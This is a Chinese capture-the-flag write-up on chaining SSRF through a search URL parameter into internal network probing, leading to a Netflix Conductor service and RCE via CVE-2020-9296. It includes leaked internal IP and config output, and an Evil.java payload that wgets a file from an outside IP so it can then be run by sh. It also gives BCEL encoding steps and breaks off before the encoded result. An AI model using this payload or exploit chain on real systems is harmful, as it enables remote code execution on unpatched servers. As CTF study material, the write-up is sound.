所以 0.0.0.0/flag是不可行的
但是却没有对search?url=${url}后的参数进行监测
那就可以
又且test方法要求以127.0.0.1访问url,那就构造
# 内网
Netflix Conductor初认识
上面已经得到hint：有Netflix Conductor服务
本菜鸡表示不知道这是啥玩意。。。
Netflix Conductor：一个微服务编排工具  
（自己理解的）  
微服务又是啥？我觉得类似就是把整坨缠绕的服务分开成单个小服务，再用api连接起来，牺牲接口的简易度换来单个小服务的复杂性降低，单个小服务的更新速度和复杂度降低。  
tips：通过分布式和微服务架构的异同可以更好的了解  
微服务编排工具：上面已经提到，各个微服务的连接和协作的难易度被提高了，但用户仍然只需要一个便于操作的“总服务”，所以就需要把这些微服务编排起来，如何并联或串联。这种理念被实体化就是微服务编排工具。
我去翻了翻官方文档，感觉并非像大多数wp中所描述的
网上找到它的端口在 8080，那么先来探测一下内网，找一下哪台机器是那个服务器  
而是其在8080端口存在Swagger APIs管理工具（图中有官方文档链接）
而Netflix Conductor所在的ip，根据Netflix Conductor的官方
> Start UI Server  
>  The UI Server is in the directory conductor/ui.  
>  To run it, you need Node.js installed and gulp installed with npm i -g
> gulp.  
>  In a terminal other than the one running the Conductor server:  
>  cd ui  
>  npm i  
>  gulp watch
>
> If you get an error message ReferenceError: primordials is not defined, you
> need to use an earlier version of Node (pre-12). See this issue for more
> details.  
>  Or Start all the services using docker-compose  
>  cd docker  
>  docker-compose up
>
> If you ran it locally, launch UI at  OR if you ran
> it using docker-compose launch the UI at 
使用docker容器的话得到两个信息：
  1. 端口可能是3000或5000被分配UI
  2. docker的分配ip，类似172.1x.0.x（这里待考证，从别人wp复制来的，晚点去查一查）
## 端口与ip
我是在buu上复现的，直接在admin登陆界面给了几个ip
    {"lo":[{"address":"127.0.0.1","netmask":"255.0.0.0","family":"IPv4","mac":"00:00:00:00:00:00","internal":true,"cidr":"127.0.0.1/8"}],"eth0":[{"address":"10.0.218.9","netmask":"255.255.255.0","family":"IPv4","mac":"02:42:0a:00:da:09","internal":false,"cidr":"10.0.218.9/24"}],"eth1":[{"address":"10.128.0.219","netmask":"255.255.0.0","family":"IPv4","mac":"52:54:00:9b:70:fe","internal":false,"cidr":"10.128.0.219/16"}]}
这里的ip不是盲目扫出来的，根据CIDR（无类域间路由）的计算划定测试范围（都是8的倍数，挺好算的）
//
得到版本信息：
    {"title":"Search Success","content":"{\"jetty.git.hash\":\"b1e6b55512e008f7fbdf1cbea4ff8a6446d1073b\",\"loadSample\":\"true\",\"io.netty.noUnsafe\":\"true\",\"conductor.jetty.server.enabled\":\"true\",\"io.netty.noKeySetOptimization\":\"true\",\"buildDate\":\"2021-04-03_17:38:09\",\"io.netty.recycler.maxCapacityPerThread\":\"0\",\"conductor.grpc.server.enabled\":\"false\",\"version\":\"2.26.0-SNAPSHOT\",\"queues.dynomite.nonQuorum.port\":\"22122\",\"workflow.elasticsearch.url\":\"es:9300\",\"workflow.namespace.queue.prefix\":\"conductor_queues\",\"user.timezone\":\"GMT\",\"workflow.dynomite.cluster.name\":\"dyno1\",\"sun.nio.ch.bugLevel\":\"\",\"workflow.dynomite.cluster.hosts\":\"dyno1:8102:us-east-1c\",\"workflow.elasticsearch.instanceType\":\"external\",\"db\":\"dynomite\",\"queues.dynomite.threads\":\"10\",\"workflow.namespace.prefix\":\"conductor\",\"workflow.elasticsearch.index.name\":\"conductor\"}"}
# RCE
## CVE-2020-9296 1day
准备Evil.java并编码
    public class Evil
    {
        public Evil() {
            try {
                Runtime.getRuntime().exec("wget http://159.75.72.126:9998/1.txt -O /tmp/hfctf");
                //Runtime.getRuntime().exec("sh /tmp/hfctf");
            }
            catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        public static void main(final String[] array) {
        }
    }
继续
    javac Evil.java
    //获取编码工具，但是它下载下来还只是java文件，要打包
    git clone https://github.com/f1tz/BCELCodeman.git 
    //下面打包
    cd BCELCodeman/src
    javac Main.java
    jar -cvfm BCELCodeman.jar ../META-INF/MANIFEST.MF Main.class
    //注意要回到Evil.class目录
    java -jar BCELCodeman/src/BCELCodeman.jar e Evil.class
    //我编码得到的如下：
    ‘’‘